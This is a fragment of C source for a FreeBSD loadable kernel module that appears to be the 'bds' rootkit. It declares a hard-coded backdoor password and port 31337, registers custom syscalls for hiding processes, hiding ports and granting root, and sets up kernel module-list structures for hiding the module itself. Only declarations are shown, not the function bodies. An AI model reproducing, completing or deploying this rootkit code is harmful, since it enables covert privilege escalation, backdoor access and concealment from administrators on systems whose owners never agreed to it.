#define BDS_PREFIX "bds"
#define BDS_PORT 31337
#define BDS_PASS "bluedragonsec"

static struct sysent syscall_bds_process_hiding_sysent = {
	.sy_narg = 1,
	.sy_call = bds_process_hiding
};

static struct sysent syscall_bds_port_hiding_sysent = {
	.sy_narg = 1,
	.sy_call = bds_port_hiding
};

static struct sysent bds_root_sysent = {
	.sy_narg = 1,
	.sy_call = bds_root     
};


static int syscall_proc_hiding_no = 210;
static int syscall_port_hiding_no = 211;
static int syscall_bds_root_no = 212;

/* start hide module vars */
extern int nextid;
extern int next_file_id;
extern struct sx kld_sx;
extern linker_file_list_t linker_files;
extern TAILQ_HEAD(modulelist, module) modules;
struct module {
        TAILQ_ENTRY(module)     link;   /* chain together all modules */
        TAILQ_ENTRY(module)     flink;  /* all modules in a file */
        struct linker_file      *file;  /* file which contains this module */
        int                     refs;   /* reference count */
        int                     id;     /* unique id number */
        char                    *name;  /* module name */
        modeventhand_t          handler;        /* event handler */
        void                    *arg;   /* argument for handler */
        modspecific_t           data;   /* module specific data */
};
/* end hide module vars */
